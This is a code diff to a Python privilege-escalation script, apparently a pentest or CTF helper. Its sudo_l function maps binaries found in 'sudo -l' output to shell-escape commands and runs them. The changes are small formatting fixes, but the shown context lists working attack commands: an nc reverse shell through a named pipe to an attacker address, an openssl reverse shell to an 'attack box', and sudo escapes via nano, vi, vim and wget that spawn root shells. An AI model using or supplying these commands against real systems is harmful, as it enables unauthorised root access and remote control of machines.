@@ -240,7 +240,7 @@ def sudo_l():
       "nano":"sudo nano\n^R^X\nreset; sh 1>&0 2>&0",
       "nc":"sudo rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <localIP> <localPORT> >/tmp/f",
       "openssl":"(on attack box:) openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\nopenssl s_server -quiet -key key.pem -cert cert.pem -port 12345\n\n(on target box:) mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | sudo openssl s_client -quiet -connect <localIP>:<localPORT> > /tmp/s; rm /tmp/s"
-     }
+   }
 
    # commands to execute if appears in sudo -l results
    sudo_bins_exec = {
@@ -268,7 +268,7 @@ def sudo_l():
       "vi":"sudo vi -c ':!/bin/sh' /dev/null", 
       "vim":"sudo vim -c ':!/bin/sh'",
       "wget":"TF=$(mktemp)&&chmod +x $TF&&echo -e '#!/bin/sh&&/bin/sh 1>&0' >$TF&&sudo wget --use-askpass=$TF 0"
-      }
+   }
 
 
    # open last line of sudo -l output to determine sudo capabilities
@@ -287,7 +287,7 @@ def sudo_l():
 
       for key in sudo_bins_exec:
          if key in lower_line:
-            print("{}: {}".format(key,sudo_bins_exec[key]))
+            print("{}: {}".format(key.strip(),sudo_bins_exec[key].strip()))
             os.system("echo '{}:{} ### can be used for privilege escalation ###' >> /tmp/esc.txt".format(key.strip(),sudo_bins_print[key].strip()))
             sudo_cmd = sudo_bins_exec[key].strip()
             print(sudo_cmd)
